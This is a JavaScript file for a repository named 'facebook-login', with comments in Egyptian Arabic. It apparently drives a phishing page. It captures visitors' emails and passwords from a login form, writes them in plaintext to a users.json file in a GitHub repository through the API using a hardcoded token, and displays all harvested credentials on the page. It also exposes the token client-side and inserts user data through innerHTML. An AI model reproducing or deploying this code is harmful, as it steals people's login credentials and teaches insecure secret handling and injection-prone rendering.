// 🔥 GitHub Token - الصق token هنا
const GITHUB_TOKEN = 'ghp_xxxxxxxxxxxxxxxx'; // الصق token بتاعك
const REPO_OWNER = '00000'; // غيّر بـ username بتاعك
const REPO_NAME = 'facebook-login'; // اسم الـ repo

document.getElementById('loginForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const message = document.getElementById('message');
    
    if (!email || !password) {
        message.innerHTML = '❌ أدخل إيميل وباسورد!';
        message.className = 'error';
        return;
    }
    
    message.innerHTML = '⏳ جاري الحفظ في GitHub...';
    
    try {
        // 1. قراءة users.json الحالي
        const currentUsers = await fetchUsers();
        
        // 2. إضافة المستخدم الجديد
        const newUser = {
            id: Date.now(),
            email: email,
            password: password,
            date: new Date().toLocaleString('ar')
        };
        currentUsers.push(newUser);
        
        // 3. حفظ في GitHub
        await saveUsers(currentUsers);
        
        message.innerHTML = `✅ تم الحفظ في GitHub! (${currentUsers.length} مستخدم)`;
        message.className = 'success';
        
        // تحديث العرض
        showUsers();
        document.getElementById('loginForm').reset();
        
    } catch (error) {
        message.innerHTML = '❌ خطأ: ' + error.message;
        message.className = 'error';
    }
});

async function fetchUsers() {
    const url = `https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/users.json`;
    const response = await fetch(url, {
        headers: { 'Authorization': `token ${GITHUB_TOKEN}` }
    });
    
    if (response.status === 404) {
        return []; // الملف مش موجود، ابدأ فاضي
    }
    
    const file = await response.json();
    const content = JSON.parse(atob(file.content));
    return content;
}

async function saveUsers(users) {
    const url = `https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/users.json`;
    
    // قراءة الملف الحالي للحصول على SHA
    let sha = null;
    try {
        const file = await fetch(url, {
            headers: { 'Authorization': `token ${GITHUB_TOKEN}` }
        });
        const currentFile = await file.json();
        sha = currentFile.sha;
    } catch (e) {
        // الملف مش موجود، مش مشكلة
    }
    
    const content = btoa(JSON.stringify(users, null, 2));
    
    await fetch(url, {
        method: 'PUT',
        headers: {
            'Authorization': `token ${GITHUB_TOKEN}`,
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            message: `Add user: ${users[users.length-1].email}`,
            content: content,
            sha: sha
        })
    });
}

async function showUsers() {
    const users = await fetchUsers();
    const message = document.getElementById('message');
    let display = '<br><h3>👥 المستخدمين من GitHub:</h3>';
    users.forEach(user => {
        display += `<p>📧 ${user.email} | 🔐 ${user.password} | 📅 ${user.date}</p>`;
    });
    message.innerHTML += display || '<p>لا يوجد مستخدمين بعد</p>';
}

// تحميل عند البداية
showUsers();

